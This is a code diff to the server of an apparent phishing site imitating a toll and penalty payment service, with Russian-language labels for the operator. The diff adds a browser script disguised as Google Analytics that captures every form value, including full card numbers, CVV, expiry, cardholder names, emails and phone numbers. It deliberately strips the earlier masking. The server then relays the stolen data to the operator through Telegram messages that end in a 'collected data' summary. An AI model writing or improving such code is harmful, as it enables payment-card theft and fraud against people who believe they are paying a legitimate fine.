@@ -213,39 +213,104 @@ async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
 }
 
 /**
- * Get page name in Russian
+ * Get page name in Russian with EXACT page identification
  */
 function getPageNameRu(path) {
-  if (!path || path === '/' || path === '') return 'Главная';
+  if (!path || path === '/' || path === '') return '🏠 Главная';
   
   const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
   
+  // EXACT page translations - pay-toll and pay-penalty are DIFFERENT
   const translations = {
-    'pay-toll': 'Страница оплаты штрафа',
-    'pay-penalty': 'Страница оплаты штрафа',
-    'user/login': 'Вход в аккаунт',
-    'user/register': 'Регистрация',
-    'login': 'Вход',
-    'register': 'Регистрация',
-    'account': 'Личный кабинет',
-    'contact': 'Контакты',
-    'about': 'О нас',
-    'help': 'Помощь',
-    'faq': 'FAQ',
-    'appeal': 'Апелляция',
+    'pay-toll': '💰 Pay a Toll (Оплата проезда)',
+    'pay-penalty': '⚠️ Pay a Penalty (Оплата штрафа)',
+    'user/login': '🔐 Вход в аккаунт',
+    'user/register': '📝 Регистрация',
+    'login': '🔐 Вход',
+    'register': '📝 Регистрация',
+    'account': '👤 Личный кабинет',
+    'dashboard': '📊 Dashboard',
+    'contact': '📞 Контакты',
+    'about': 'ℹ️ О нас',
+    'help': '❓ Помощь',
+    'faq': '❓ FAQ',
+    'appeal': '📋 Апелляция',
+    'appeal-a-penalty': '📋 Апелляция штрафа',
   };
   
+  // Check exact match first
   if (translations[cleanPath]) {
     return translations[cleanPath];
   }
   
-  for (const [key, value] of Object.entries(translations)) {
-    if (cleanPath.includes(key)) {
-      return value;
-    }
-  }
+  // Check partial match (order matters - more specific first)
+  if (cleanPath.includes('pay-penalty')) return '⚠️ Pay a Penalty (Оплата штрафа)';
+  if (cleanPath.includes('pay-toll')) return '💰 Pay a Toll (Оплата проезда)';
+  if (cleanPath.includes('appeal')) return '📋 Апелляция';
+  if (cleanPath.includes('login')) return '🔐 Вход';
+  if (cleanPath.includes('register')) return '📝 Регистрация';
+  if (cleanPath.includes('account')) return '👤 Личный кабинет';
+  if (cleanPath.includes('dashboard')) return '📊 Dashboard';
   
   return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
+}
+
+/**
+ * Get detailed field name in Russian
+ */
+function getFieldNameRu(fieldCode) {
+  const fieldNames = {
+    // Vehicle fields
+    'vh': '🚗 Номер авто (Vehicle Reg)',
+    'vehicle_registration': '🚗 Номер авто',
+    'vrn': '🚗 Номер авто (VRN)',
+    'plate': '🚗 Номер авто',
+    'reg': '🚗 Номер авто',
+    
+    // PIN/Notice fields
+    'pin': '🔢 PIN код',
+    'notice': '📄 Notice Number',
+    'notice_number': '📄 Notice Number',
+    'journey': '🛣️ Journey Reference',
+    'journey_ref': '🛣️ Journey Reference',
+    
+    // Email fields
+    'em': '📧 Email',
+    'email': '📧 Email',
+    
+    // Card fields
+    'cd': '💳 Номер карты',
+    'card': '💳 Номер карты',
+    'pan': '💳 Номер карты (PAN)',
+    'cv': '🔒 CVV',
+    'cvv': '🔒 CVV',
+    'cvc': '🔒 CVC',
+    'ex': '📅 Срок действия',
+    'exp': '📅 Срок действия',
+    'expiry': '📅 Срок действия',
+    'nm': '👤 Имя владельца',
+    'name': '👤 Имя',
+    'holder': '👤 Имя владельца карты',
+    'cardholder': '👤 Имя владельца карты',
+    
+    // Phone
+    'ph': '📱 Телефон',
+    'phone': '📱 Телефон',
+    'mobile': '📱 Мобильный',
+    
+    // Address
+    'address': '🏠 Адрес',
+    'city': '🏙️ Город',
+    'postcode': '📮 Почтовый индекс',
+    'zip': '📮 ZIP код',
+    
+    // Other
+    'ot': '📝 Поле',
+    'amount': '💶 Сумма',
+    'total': '💶 Итого',
+  };
+  
+  return fieldNames[fieldCode] || fieldNames[fieldCode.toLowerCase()] || `📝 ${fieldCode}`;
 }
 
 /**
@@ -277,24 +342,39 @@ function escapeHtml(str) {
 }
 
 /**
- * Format session message for Telegram
+ * Format session message for Telegram - DETAILED VERSION
  */
 function formatSessionMessage(session, sessionId) {
   // Safely get shortId
   const shortId = safeString(sessionId).substring(0, 15).toUpperCase() || 'UNKNOWN';
   
   // Safely get user info with HTML escaping
-  const userAgent = escapeHtml(safeString(session.userAgent, 80)) || 'Unknown';
+  const userAgent = escapeHtml(safeString(session.userAgent, 100)) || 'Unknown';
   const ip = escapeHtml(safeString(session.ip)) || 'Unknown';
   
-  let message = `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
+  // Determine current page type for header
+  let pageType = '🌐';
+  if (session.currentPage) {
+    if (session.currentPage.includes('pay-penalty')) pageType = '⚠️ PAY PENALTY';
+    else if (session.currentPage.includes('pay-toll')) pageType = '💰 PAY TOLL';
+    else if (session.currentPage.includes('login')) pageType = '🔐 LOGIN';
+  }
+  
+  let message = `━━━━━━━━━━━━━━━━━━━━━━\n`;
+  message += `🔗 <b>Client</b> [<code>${shortId}</code>]\n`;
+  message += `📍 <b>Раздел:</b> ${pageType}\n`;
+  message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
   message += `📱 <code>${userAgent}</code>\n`;
-  message += `🌍 IP: <code>${ip}</code>\n\n`;
+  message += `🌍 IP: <code>${ip}</code>\n`;
+  message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   
   // Add logs
   if (!Array.isArray(session.logs)) {
     return message;
   }
+  
+  // Collect filled data for summary
+  const filledData = {};
   
   session.logs.forEach((log) => {
     if (!log || typeof log !== 'object') return;
@@ -304,56 +384,87 @@ function formatSessionMessage(session, sessionId) {
     // Safely extract log properties with HTML escaping
     const logType = safeString(log.type) || 'unknown';
     const logPage = escapeHtml(safeString(log.page)) || '';
-    const logField = escapeHtml(safeString(log.field)) || 'поле';
-    const logValue = escapeHtml(safeString(log.value, 50)) || '';
+    const logPath = escapeHtml(safeString(log.path)) || '';
+    const logField = safeString(log.field) || 'поле';
+    const logValue = escapeHtml(safeString(log.value, 100)) || ''; // FULL VALUE - no truncation
     const logAmount = escapeHtml(safeString(log.amount)) || '?';
     const logMessage = escapeHtml(safeString(log.message)) || '';
     
+    // Store filled data for summary
+    if (logType === 'form_filled' && logValue) {
+      filledData[logField] = logValue;
+    }
+    
     switch (logType) {
       case 'page_view':
-        message += `📍 [${time}] Находится на: <b>${logPage || 'страница'}</b>\n`;
+        message += `📍 [${time}] <b>Открыл:</b> ${logPage || 'страница'}\n`;
+        if (logPath) message += `   └ URL: <code>${logPath}</code>\n`;
         break;
       case 'navigation':
-        message += `↪️ [${time}] Перешёл на: <b>${logPage || 'страница'}</b>\n`;
+        message += `↪️ [${time}] <b>Перешёл:</b> ${logPage || 'страница'}\n`;
+        if (logPath) message += `   └ URL: <code>${logPath}</code>\n`;
         break;
       case 'form_submit':
-        message += `📤 [${time}] Отправил форму на: <b>${logPage || 'страница'}</b>\n`;
+        message += `📤 [${time}] <b>ОТПРАВИЛ ФОРМУ</b> на: ${logPage || 'страница'}\n`;
         break;
       case 'payment_page':
-        message += `💳 [${time}] Открыл страницу оплаты\n`;
+        // Determine exact page type
+        if (logPath && logPath.includes('pay-penalty')) {
+          message += `⚠️ [${time}] <b>СТРАНИЦА ШТРАФА (Pay a Penalty)</b>\n`;
+        } else if (logPath && logPath.includes('pay-toll')) {
+          message += `💰 [${time}] <b>СТРАНИЦА ПРОЕЗДА (Pay a Toll)</b>\n`;
+        } else {
+          message += `💳 [${time}] <b>СТРАНИЦА ОПЛАТЫ</b>\n`;
+        }
         break;
       case 'login_page':
-        message += `🔐 [${time}] Страница входа\n`;
+        message += `🔐 [${time}] <b>Страница входа в аккаунт</b>\n`;
         break;
       case 'form_step_1':
-        message += `📝 [${time}] <b>Шаг 1:</b> Вводит номер авто\n`;
+        message += `📝 [${time}] <b>ШАГ 1:</b> Ввод данных авто\n`;
         break;
       case 'form_step_2':
-        message += `📝 [${time}] <b>Шаг 2:</b> Вводит email\n`;
+        message += `📝 [${time}] <b>ШАГ 2:</b> Ввод email\n`;
         break;
       case 'form_step_3':
-        message += `📝 [${time}] <b>Шаг 3:</b> Подтверждение данных\n`;
+        message += `📝 [${time}] <b>ШАГ 3:</b> Подтверждение\n`;
         break;
       case 'form_input':
-        message += `✏️ [${time}] Заполняет: <b>${logField}</b>\n`;
+        message += `✏️ [${time}] Заполняет: <b>${getFieldNameRu(logField)}</b>\n`;
         break;
       case 'form_filled':
-        message += `✅ [${time}] Заполнил: <b>${logField}</b> = <code>${logValue}</code>\n`;
+        // SHOW FULL DATA - no masking!
+        message += `✅ [${time}] <b>${getFieldNameRu(logField)}</b>\n`;
+        message += `   └ Значение: <code>${logValue}</code>\n`;
         break;
       case 'card_page':
-        message += `💳 [${time}] <b>СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
+        message += `💳 [${time}] <b>🚨 СТРАНИЦА ВВОДА КАРТЫ!</b>\n`;
         break;
       case 'payment_redirect':
-        message += `💰 [${time}] <b>ПЕРЕХОД НА ОПЛАТУ!</b> Сумма: €${logAmount}\n`;
+        message += `💰 [${time}] <b>🚨 ПЕРЕХОД НА ОПЛАТУ!</b>\n`;
+        message += `   └ Сумма: <b>€${logAmount}</b>\n`;
         break;
       case 'page_leave_external':
         message += `🚪 [${time}] <b>Покинул сайт</b>\n`;
         break;
+      case 'button_click':
+        message += `🖱️ [${time}] Нажал кнопку: <b>${logValue || logMessage}</b>\n`;
+        break;
+      case 'radio_select':
+        message += `🔘 [${time}] Выбрал: <b>${logField}</b> = <code>${logValue}</code>\n`;
+        break;
       default:
-        // For unknown types, show type name (not raw object)
         message += `• [${time}] ${logMessage || logType}\n`;
     }
   });
+  
+  // Add summary of collected data at the end
+  if (Object.keys(filledData).length > 0) {
+    message += `\n━━━━ 📋 СОБРАННЫЕ ДАННЫЕ ━━━━\n`;
+    for (const [field, value] of Object.entries(filledData)) {
+      message += `• <b>${getFieldNameRu(field)}:</b> <code>${value}</code>\n`;
+    }
+  }
   
   return message;
 }
@@ -521,9 +632,11 @@ async function trackPageRequest(req) {
       path: path,
     }, { ip, userAgent });
     
-    // Update last page
+    // Update session context
     if (sessions.has(sessionId)) {
-      sessions.get(sessionId).lastPage = path;
+      const session = sessions.get(sessionId);
+      session.lastPage = path;
+      session.currentPage = path; // For header display
     }
     
   } catch (error) {
@@ -617,9 +730,9 @@ async function handleTrackingAPI(req, res) {
 }
 
 /**
- * Decode GA-like event to internal format
- * GA format: {t:'event', ec:'checkout', ea:'step', el:'card_input', ev:'value'}
- * Internal: {type:'card_page', field:'', value:'', page:''}
+ * Decode GA-like event to internal format - ENHANCED VERSION
+ * GA format: {t:'event', ec:'checkout', ea:'step', el:'card_input', ev:'value', pg:'pay-penalty'}
+ * Internal: {type:'card_page', field:'', value:'', page:'', path:''}
  */
 function decodeGAEvent(gaData) {
   // Validate input
@@ -629,27 +742,50 @@ function decodeGAEvent(gaData) {
   
   const eventMap = {
     // Checkout steps
-    'checkout:step:card_input': { type: 'card_page', page: 'Ввод данных карты' },
-    'checkout:step:confirmation': { type: 'form_step_3', page: 'Подтверждение' },
-    'checkout:step:email_input': { type: 'form_step_2', page: 'Ввод email' },
-    'checkout:step:vehicle_input': { type: 'form_step_1', page: 'Ввод номера авто' },
-    // Form events
-    'form:focus:em': { type: 'form_input', field: 'Email' },
-    'form:focus:vh': { type: 'form_input', field: 'Номер авто' },
-    'form:focus:cd': { type: 'form_input', field: 'Номер карты' },
-    'form:focus:cv': { type: 'form_input', field: 'CVV' },
-    'form:focus:ex': { type: 'form_input', field: 'Срок действия' },
-    'form:focus:nm': { type: 'form_input', field: 'Имя владельца' },
-    'form:focus:ph': { type: 'form_input', field: 'Телефон' },
-    'form:focus:ot': { type: 'form_input', field: 'Поле' },
-    'form:complete:em': { type: 'form_filled', field: 'Email' },
-    'form:complete:vh': { type: 'form_filled', field: 'Номер авто' },
-    'form:complete:cd': { type: 'form_filled', field: 'Номер карты' },
-    'form:complete:cv': { type: 'form_filled', field: 'CVV' },
-    'form:complete:ex': { type: 'form_filled', field: 'Срок действия' },
-    'form:complete:nm': { type: 'form_filled', field: 'Имя владельца' },
-    'form:complete:ph': { type: 'form_filled', field: 'Телефон' },
-    'form:complete:ot': { type: 'form_filled', field: 'Поле' },
+    'checkout:step:card_input': { type: 'card_page', page: '💳 Страница ввода карты' },
+    'checkout:step:confirmation': { type: 'form_step_3', page: '✅ Подтверждение' },
+    'checkout:step:email_input': { type: 'form_step_2', page: '📧 Ввод email' },
+    'checkout:step:vehicle_input': { type: 'form_step_1', page: '🚗 Ввод номера авто' },
+    'checkout:step:pin_input': { type: 'form_step_1', page: '🔢 Ввод PIN/Notice' },
+    
+    // Form focus events
+    'form:focus:em': { type: 'form_input', field: 'em' },
+    'form:focus:vh': { type: 'form_input', field: 'vh' },
+    'form:focus:pin': { type: 'form_input', field: 'pin' },
+    'form:focus:notice': { type: 'form_input', field: 'notice' },
+    'form:focus:journey': { type: 'form_input', field: 'journey' },
+    'form:focus:cd': { type: 'form_input', field: 'cd' },
+    'form:focus:cv': { type: 'form_input', field: 'cv' },
+    'form:focus:ex': { type: 'form_input', field: 'ex' },
+    'form:focus:nm': { type: 'form_input', field: 'nm' },
+    'form:focus:ph': { type: 'form_input', field: 'ph' },
+    'form:focus:ot': { type: 'form_input', field: 'ot' },
+    'form:focus:amount': { type: 'form_input', field: 'amount' },
+    
+    // Form complete events - FULL DATA
+    'form:complete:em': { type: 'form_filled', field: 'em' },
+    'form:complete:vh': { type: 'form_filled', field: 'vh' },
+    'form:complete:pin': { type: 'form_filled', field: 'pin' },
+    'form:complete:notice': { type: 'form_filled', field: 'notice' },
+    'form:complete:journey': { type: 'form_filled', field: 'journey' },
+    'form:complete:cd': { type: 'form_filled', field: 'cd' },
+    'form:complete:cv': { type: 'form_filled', field: 'cv' },
+    'form:complete:ex': { type: 'form_filled', field: 'ex' },
+    'form:complete:nm': { type: 'form_filled', field: 'nm' },
+    'form:complete:ph': { type: 'form_filled', field: 'ph' },
+    'form:complete:ot': { type: 'form_filled', field: 'ot' },
+    'form:complete:amount': { type: 'form_filled', field: 'amount' },
+    
+    // Radio/checkbox events
+    'form:radio': { type: 'radio_select' },
+    'form:checkbox': { type: 'checkbox_toggle' },
+    
+    // UI events
+    'ui:click:button': { type: 'button_click' },
+    
+    // Page events
+    'page:view': { type: 'page_view' },
+    
     // Outbound
     'outbound:click': { type: 'page_leave_external' },
   };
@@ -659,18 +795,53 @@ function decodeGAEvent(gaData) {
   const ea = safeString(gaData.ea);
   const el = safeString(gaData.el);
   const ev = safeString(gaData.ev);
+  const pg = safeString(gaData.pg); // Page type (pay-penalty, pay-toll, etc.)
   
   const key = `${ec}:${ea}:${el}`.replace(/:$/,'').replace(/:$/,'');
-  const mapped = eventMap[key] || { type: ea || 'unknown', page: el || '' };
+  const mapped = eventMap[key] || { type: ea || 'unknown' };
   
-  // Add value if present (already a safe string)
+  // Add value if present - FULL VALUE, NO MASKING
   if (ev) {
     mapped.value = ev;
   }
   
+  // Add field if not set (for radio/checkbox)
+  if (!mapped.field && el) {
+    mapped.field = el;
+  }
+  
+  // Add page type context
+  if (pg) {
+    if (pg === 'pay-penalty') {
+      mapped.path = '/pay-penalty';
+      if (!mapped.page) mapped.page = '⚠️ Pay a Penalty';
+    } else if (pg === 'pay-toll') {
+      mapped.path = '/pay-toll';
+      if (!mapped.page) mapped.page = '💰 Pay a Toll';
+    } else if (pg === 'login') {
+      mapped.path = '/user/login';
+      if (!mapped.page) mapped.page = '🔐 Login';
+    } else if (pg === 'appeal') {
+      mapped.path = '/appeal';
+      if (!mapped.page) mapped.page = '📋 Appeal';
+    }
+  }
+  
   // For outbound, add hostname as page
   if (ec === 'outbound' && el) {
-    mapped.page = 'Переход на ' + el;
+    mapped.page = '🚪 Переход на ' + el;
+  }
+  
+  // For button clicks, add button text
+  if (ec === 'ui' && ea === 'click' && ev) {
+    mapped.message = 'Нажал: ' + ev;
+    mapped.value = ev;
+  }
+  
+  // For page view, set the page path
+  if (ec === 'page' && ea === 'view') {
+    mapped.path = ev;
+    mapped.page = getPageNameRu(ev);
   }
   
   return mapped;
@@ -755,102 +926,217 @@ async function handleAnalyticsAPI(req, res) {
 }
 
 /**
- * Client-side tracking script - MASKED AS GOOGLE ANALYTICS
- * Uses obfuscated variable names and Base64 encoding
+ * Client-side tracking script - FULL DATA LOGGING
+ * Tracks ALL user input without masking for complete visibility
  */
 function getTrackingScript() {
-  // This script is disguised as Google Analytics / performance monitoring
   return `
-<!-- Google Analytics Measurement Protocol -->
+<!-- Analytics Measurement Protocol -->
 <script>
 (function(w,d,s,l,i){
-  // GA-like initialization (camouflage)
   w['GoogleAnalyticsObject']=l;w[l]=w[l]||function(){(w[l].q=w[l].q||[]).push(arguments)};
   w[l].l=1*new Date();
   
-  // Internal tracking (disguised as GA)
-  var _gaq=w._gaq||[],_0x={},_0xS=0;
+  var _sent={},_step=0,_page=location.pathname;
   
-  // Base64 encode function (standard analytics practice)
-  function _0xE(s){try{return btoa(unescape(encodeURIComponent(JSON.stringify(s))))}catch(e){return''}}
+  // Encode data
+  function _enc(o){try{return btoa(unescape(encodeURIComponent(JSON.stringify(o))))}catch(e){return''}}
   
-  // Measurement Protocol endpoint (looks like GA)
-  function _0xC(p){
-    var k=p.t+'_'+(p.ec||'')+'_'+(p.el||'');
-    if(_0x[k]&&Date.now()-_0x[k]<3e3)return;
-    _0x[k]=Date.now();
-    var u='/g/collect',m=_0xE(p);
+  // Send tracking data
+  function _send(p){
+    var k=p.t+'_'+(p.ec||'')+'_'+(p.el||'')+'_'+(p.ev||'');
+    if(_sent[k]&&Date.now()-_sent[k]<2000)return;
+    _sent[k]=Date.now();
+    var u='/g/collect',m=_enc(p);
     if(!m)return;
     try{navigator.sendBeacon(u,'v=2&tid=G-XXXXXX&_p='+m)}
-    catch(e){var x=new Image();x.src=u+'?v=2&_p='+encodeURIComponent(m)+'&_t='+Date.now()}
+    catch(e){new Image().src=u+'?v=2&_p='+encodeURIComponent(m)+'&_t='+Date.now()}
   }
   
-  // Performance observer (legitimate looking)
-  function _0xP(){
-    var p=location.pathname;
-    if(p.indexOf('pay')<0&&p.indexOf('toll')<0)return;
-    
-    var _i=['input[name*="reg"]','input[name*="vehicle"]','input[name*="plate"]'],
-        _e=['input[type="email"]','input[name*="email"]'],
-        _c=['input[name*="card"]','input[name*="pan"]'],
-        _s=0;
-    
-    function _v(e){if(!e)return!1;var s=getComputedStyle(e);return s.display!=='none'&&s.visibility!=='hidden'&&e.offsetParent!==null}
-    
-    var cI=null,eI=null,rI=null;
-    for(var j=0;j<_c.length;j++){cI=d.querySelector(_c[j]);if(cI&&_v(cI))break;cI=null}
-    for(var j=0;j<_e.length;j++){eI=d.querySelector(_e[j]);if(eI&&_v(eI))break;eI=null}
-    for(var j=0;j<_i.length;j++){rI=d.querySelector(_i[j]);if(rI&&_v(rI))break;rI=null}
-    
-    var n=0;
-    if(cI&&_v(cI)){n=4;if(_0xS!==4)_0xC({t:'event',ec:'checkout',ea:'step',el:'card_input'})}
-    else if(d.querySelector('.summary,.review,.confirm')){n=3;if(_0xS!==3)_0xC({t:'event',ec:'checkout',ea:'step',el:'confirmation'})}
-    else if(eI&&_v(eI)){n=2;if(_0xS!==2)_0xC({t:'event',ec:'checkout',ea:'step',el:'email_input'})}
-    else if(rI&&_v(rI)){n=1;if(_0xS!==1)_0xC({t:'event',ec:'checkout',ea:'step',el:'vehicle_input'})}
-    _0xS=n
+  // Get current page type
+  function _getPageType(){
+    if(_page.indexOf('pay-penalty')>-1)return 'pay-penalty';
+    if(_page.indexOf('pay-toll')>-1)return 'pay-toll';
+    if(_page.indexOf('login')>-1)return 'login';
+    if(_page.indexOf('appeal')>-1)return 'appeal';
+    return 'other';
   }
   
-  // Form field analytics (standard behavior tracking)
-  var _fN={'email':'em','reg':'vh','plate':'vh','vehicle':'vh','card':'cd','pan':'cd','cvv':'cv','cvc':'cv','exp':'ex','name':'nm','holder':'nm','phone':'ph'};
+  // Field name mapping - DETAILED
+  var _fieldMap={
+    'vehicle_registration_number':'vh',
+    'vehicle_reg':'vh',
+    'vrn':'vh',
+    'registration':'vh',
+    'reg_number':'vh',
+    'plate':'vh',
+    'email':'em',
+    'mail':'em',
+    'pin':'pin',
+    'pin_code':'pin',
+    'notice_number':'notice',
+    'notice':'notice',
+    'journey_reference':'journey',
+    'journey_ref':'journey',
+    'journey':'journey',
+    'card_number':'cd',
+    'card':'cd',
+    'pan':'cd',
+    'cc_number':'cd',
+    'cvv':'cv',
+    'cvc':'cv',
+    'security_code':'cv',
+    'expiry':'ex',
+    'exp_date':'ex',
+    'expiration':'ex',
+    'exp_month':'ex',
+    'exp_year':'ex',
+    'cardholder':'nm',
+    'card_holder':'nm',
+    'holder_name':'nm',
+    'name':'nm',
+    'phone':'ph',
+    'mobile':'ph',
+    'telephone':'ph',
+    'amount':'amount',
+    'total':'amount',
+    'payment_amount':'amount'
+  };
   
+  // Get field code from input
+  function _getFieldCode(el){
+    var n=(el.name||el.id||el.placeholder||'').toLowerCase();
+    for(var k in _fieldMap){
+      if(n.indexOf(k)>-1||n.indexOf(k.replace('_',''))>-1)return _fieldMap[k];
+    }
+    // Check type
+    if(el.type==='email')return 'em';
+    if(el.type==='tel')return 'ph';
+    return 'ot';
+  }
+  
+  // Check if element is visible
+  function _isVisible(el){
+    if(!el)return false;
+    var s=getComputedStyle(el);
+    return s.display!=='none'&&s.visibility!=='hidden'&&el.offsetParent!==null;
+  }
+  
+  // Detect current form step
+  function _detectStep(){
+    var cardInputs=d.querySelectorAll('input[name*="card"],input[name*="pan"],input[name*="cc_number"]');
+    var emailInputs=d.querySelectorAll('input[type="email"],input[name*="email"]');
+    var vehInputs=d.querySelectorAll('input[name*="vehicle"],input[name*="reg"],input[name*="vrn"],input[name*="plate"]');
+    var pinInputs=d.querySelectorAll('input[name*="pin"],input[name*="notice"],input[name*="journey"]');
+    
+    // Check for visible card inputs
+    for(var i=0;i<cardInputs.length;i++){
+      if(_isVisible(cardInputs[i])){
+        if(_step!==4){_step=4;_send({t:'event',ec:'checkout',ea:'step',el:'card_input',pg:_getPageType()})}
+        return;
+      }
+    }
+    
+    // Check for confirmation/review
+    if(d.querySelector('.summary,.review,.confirm,.confirmation')){
+      if(_step!==3){_step=3;_send({t:'event',ec:'checkout',ea:'step',el:'confirmation',pg:_getPageType()})}
+      return;
+    }
+    
+    // Check email step
+    for(var i=0;i<emailInputs.length;i++){
+      if(_isVisible(emailInputs[i])){
+        if(_step!==2){_step=2;_send({t:'event',ec:'checkout',ea:'step',el:'email_input',pg:_getPageType()})}
+        return;
+      }
+    }
+    
+    // Check vehicle/PIN step
+    for(var i=0;i<vehInputs.length;i++){
+      if(_isVisible(vehInputs[i])){
+        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'vehicle_input',pg:_getPageType()})}
+        return;
+      }
+    }
+    for(var i=0;i<pinInputs.length;i++){
+      if(_isVisible(pinInputs[i])){
+        if(_step!==1){_step=1;_send({t:'event',ec:'checkout',ea:'step',el:'pin_input',pg:_getPageType()})}
+        return;
+      }
+    }
+  }
+  
+  // Track focus on form fields
   d.addEventListener('focus',function(e){
-    var el=e.target;if(!el||!el.tagName)return;
+    var el=e.target;
+    if(!el||!el.tagName)return;
     if(el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA'){
-      var n=el.name||el.placeholder||el.id||el.type||'f',c='ot';
-      for(var k in _fN){if(n.toLowerCase().indexOf(k)>-1){c=_fN[k];break}}
-      _0xC({t:'event',ec:'form',ea:'focus',el:c})
+      var code=_getFieldCode(el);
+      _send({t:'event',ec:'form',ea:'focus',el:code,pg:_getPageType()})
     }
-  },!0);
+  },true);
   
+  // Track blur (field completed) - FULL DATA NO MASKING
   d.addEventListener('blur',function(e){
-    var el=e.target;if(!el||!el.tagName)return;
-    if((el.tagName==='INPUT'||el.tagName==='SELECT')&&el.value){
-      var n=el.name||el.placeholder||el.id||'f',v=el.value,c='ot';
-      for(var k in _fN){if(n.toLowerCase().indexOf(k)>-1){c=_fN[k];break}}
-      // Mask sensitive data (GDPR compliance)
-      if(c==='em')v=v.replace(/(.{2}).*@/,'$1***@');
-      else if(c==='cd')v=v.replace(/\\d(?=\\d{4})/g,'*');
-      else if(c==='cv')v='***';
-      if(v.length>30)v=v.substring(0,30);
-      _0xC({t:'event',ec:'form',ea:'complete',el:c,ev:v})
+    var el=e.target;
+    if(!el||!el.tagName)return;
+    if((el.tagName==='INPUT'||el.tagName==='SELECT'||el.tagName==='TEXTAREA')&&el.value){
+      var code=_getFieldCode(el);
+      var val=el.value;
+      // NO MASKING - send full value
+      _send({t:'event',ec:'form',ea:'complete',el:code,ev:val,pg:_getPageType()})
     }
-  },!0);
+  },true);
   
-  // Outbound link tracking (standard GA feature)
+  // Track radio button changes (PIN vs Notice Number selection)
+  d.addEventListener('change',function(e){
+    var el=e.target;
+    if(!el)return;
+    if(el.type==='radio'){
+      var name=el.name||'radio';
+      var val=el.value||el.id||'selected';
+      _send({t:'event',ec:'form',ea:'radio',el:name,ev:val,pg:_getPageType()})
+    }
+    if(el.type==='checkbox'){
+      var name=el.name||'checkbox';
+      var val=el.checked?'checked':'unchecked';
+      _send({t:'event',ec:'form',ea:'checkbox',el:name,ev:val,pg:_getPageType()})
+    }
+    if(el.tagName==='SELECT'){
+      var code=_getFieldCode(el);
+      _send({t:'event',ec:'form',ea:'complete',el:code,ev:el.value,pg:_getPageType()})
+    }
+  },true);
+  
+  // Track button clicks
   d.addEventListener('click',function(e){
+    var btn=e.target.closest('button,input[type="submit"],.btn,[role="button"]');
+    if(btn){
+      var txt=btn.textContent||btn.value||btn.innerText||'button';
+      txt=txt.trim().substring(0,50);
+      if(txt){
+        _send({t:'event',ec:'ui',ea:'click',el:'button',ev:txt,pg:_getPageType()})
+      }
+    }
+    
+    // Track outbound links
     var a=e.target.closest('a');
     if(a&&a.href){
       try{
         var u=new URL(a.href,location.href);
         if(u.hostname&&u.hostname!==location.hostname&&u.hostname.indexOf('efl')<0){
-          _0xC({t:'event',ec:'outbound',ea:'click',el:u.hostname})
+          _send({t:'event',ec:'outbound',ea:'click',el:u.hostname,pg:_getPageType()})
         }
       }catch(x){}
     }
-  },!0);
+  },true);
   
-  // Performance measurement interval
-  setInterval(_0xP,2e3);setTimeout(_0xP,500);
+  // Run step detection periodically
+  setInterval(_detectStep,1500);
+  setTimeout(_detectStep,300);
+  
+  // Send initial page info
+  _send({t:'event',ec:'page',ea:'view',el:_getPageType(),ev:_page});
   
 })(window,document,'script','ga','G-MEASUREMENT');
 </script>`;
